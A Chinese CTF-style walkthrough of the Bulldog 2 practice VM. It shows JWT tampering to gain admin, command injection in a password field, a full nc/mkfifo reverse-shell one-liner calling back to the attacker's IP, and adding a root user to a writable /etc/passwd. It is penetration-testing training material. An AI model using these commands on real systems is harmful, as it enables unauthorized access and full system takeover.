# 渗透测试实战-bulldog 2靶机入侵

阅读量 **360329**

|评论 **10**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-09-27 16:30:30

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t0179f8cbdb6cc1c4f0.jpg)

## 前言

大家好！爱写靶机渗透文章的我又来了，因为是在工作闲暇时间做的靶机解题，所以更新可能会比较慢，为什么这篇要写在这个靶机呐？因为看到现在很多ctf和靶机都在使用nodojs出题，有可能会是个趋势，所以碰到了就写篇文章，让大家以后有个认识。

## 靶机安装/下载

bulldog 2靶机下载：<https://pan.baidu.com/s/1crkVi54RbhczmqyHw3W1XQ>

bulldog 2靶机ip：172.16.24.78  
攻击者ip：172.16.24.89

![](https://p4.ssl.qhimg.com/t01ef2b749ed1fd4524.png)

###  实战

第一步不用怀疑，肯定还是nmap 神器开路

![](https://p5.ssl.qhimg.com/t0109282e4b9bcec16d.png)

可以看到该靶机只开放了80端口…, 下一部小伙伴们肯定是要探测目录了

![](https://p1.ssl.qhimg.com/t01ed431f6fafd480ab.png)

通过目录猜解可以看到没有发现什么可利用的目录，那根据个人经验估计突破口肯定在js文件里，  
我们访问该靶机80端口，查看其js的调用情况。如图：

![](https://p1.ssl.qhimg.com/t01c2437c2bd19e19a3.png)

可以看到该靶机首页调用了4个js文件，我们分别访问，美化一下看看（肯定有小伙伴要问了，为什么要美化。。 因为不美化是这样的，如图  

小弟这里把这4个js文件美化保持到本地, 下一步就是对其逐一进行审计查看，我们在查看页面的时候可以看到，页面上有个注册功能，但是我们点击报错。。。

![](https://p2.ssl.qhimg.com/t015ffd3e4674556cb6.png)

![](https://p2.ssl.qhimg.com/t01bb5cbd1fc10f2ef8.png)

我们使用 “register” 做为关键字对刚刚美化保存的4个js文件进行搜索，可以看到有所发现，如图：

![](https://p3.ssl.qhimg.com/t017329c94eaef25ff7.png)

![](https://p5.ssl.qhimg.com/t01502462c2ae193d24.png)

根据js上的定义，我们可以使用 post提交 新账户信息来完成注册，但是注意这里有2点要求：

  1. Content-Type 必须要是：application/json
  2. post 数据包内容处，必须要严格按照js代码里的规范

post 数据包：

    
    
    POST /users/register HTTP/1.1
    Host: 172.16.24.78
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:62.0) Gecko/20100101 Firefox/62.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: close
    Upgrade-Insecure-Requests: 1
    If-Modified-Since: Sun, 15 Jul 2018 14:58:16 GMT
    If-None-Match: W/“465-1649e73083e”
    Content-Type: application/json
    Content-Length: 96
    
    {
    “name”: “aqk”,
    “email”: “aqk@test.com”,
    “username”: “aqk”,
    “password”: “123456”
    }

![](https://p4.ssl.qhimg.com/t01c590e508561e520a.png)

可以看到返回true，注册成功了，我们使用 “aqk”账号来登陆一下看看，  

可以看到已经成功登陆这个新账户的，但是没办法继续利用啊，怎么办。我们先退出登陆，回到注册点，在登陆看看，  
1.先验证用户账户密码，如图：  

2.账号密码正确后，该靶机传递一个奇怪的tonken，如图：  

下一步我们就来解密一下看这个tonken传递了什么内容，我们可以去Google搜索 “jwt 解密”
（注：百度搜索这个关键词出现一堆有的没的，谷歌搜索第一条就是我们想要的。优秀）  
解密网址：<https://jwt.io>

我们把那个tonken后面的编码复制进去查询一下看看，如图：  

可以看到一个可疑的参数：“auth_level”，通过名字就应该知道是判断用户权限的，我们进行使用这个参数去刚刚保存的几个js文件里搜索看看，如图：

![](https://p5.ssl.qhimg.com/t01d3f06b9e41bfb677.png)

在743行代码处，看到它的判断，下一步我们只需要把“master_admin_user” 替换掉原来的就行，如图：  
  
下一步就是复制修改后的新编码替换原来的编码，注：后面明文处也要修改成“master_admin_user”，如图：  

放包以后，我们成功已经变成了 admin 账户，

![](https://p2.ssl.qhimg.com/t01a25e70dbc2c43b31.png)

下一步突破口在修改密码处，为什么呢？因为前面测试的时候找到了其github上托管的代码，并发现在修改密码的密码处存在命令执行漏洞，如图：

  1. 报错信息：

  
关键字“Bulldog-2-The-Reckoning”

2.github搜索  

3.发现漏洞

![](https://p4.ssl.qhimg.com/t010abcdca52f95d73c.png)

当然各位小伙伴们也可以不用这么麻烦手动挖掘到这个漏洞，因为就那么2个功能页面。。。  
下面我们就直接在修改密码处执行漏洞拿反弹shell，如图：  
  
注：此处的反弹shell命令为：rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc
172.16.24.89 6666 >/tmp/f  

成功拿到shell。

接下来肯定是提权了，相信看过小弟文章的都知道，该怎么弄了，这次小弟写个不一样的。  
1.切换到/etc，查看passwd文件读写权限，如图：  
  
（注：命令出现重复，是特例，小伙伴们如果碰到这种情况，重新反弹一个shell回来就行，小弟懒，就算了…)  
可以看到passwd文件可以写。。。 我们查看一下用户  

下一步我们只需要新建一个root用户就行，操作如下：  
1.命令：perl -le ‘print crypt(“pass”, “aa”)’  

2.复制 passwd文件里 root 用户那列继续修改，如图

  
注：我们只需要修改3处：一个是名字、一个是刚刚编译出来的密文、一个是跟名字一样。此处的 0:0
切记不可修改，相信小伙伴们都了解过passwd文件的对于的权限类型

下一步我们就直接把这个新创建的用户写入passwd文件里即可，

![](https://p3.ssl.qhimg.com/t01c9a1e9a26f652445.png)

确认一切都没问题了，就可以直接输入命令：su hack  
密码为刚刚设置的：pass  
成功拿到root权限，并拿到flag，如图：  

## 结语

不管是靶机的安全检测还是平时的渗透测试工作，我们都不应该去忽略js文件，可能有惊喜哦！多花点时间多考虑一个点，我相信你会有更多收获！最后祝大家生活愉快，国庆节快乐！

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **d3ckx1** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/160755](/post/id/160755)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [渗透测试](/tag/渗透测试)
  * [实战](/tag/实战)
  * [靶机入侵](/tag/靶机入侵)
  * [node入侵](/tag/node入侵)

 **+1** __18赞

 __收藏

![](https://p5.ssl.qhmsg.com/dm/200_200_100/t017a53cae377f0cd5e.jpg) d3ckx1

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

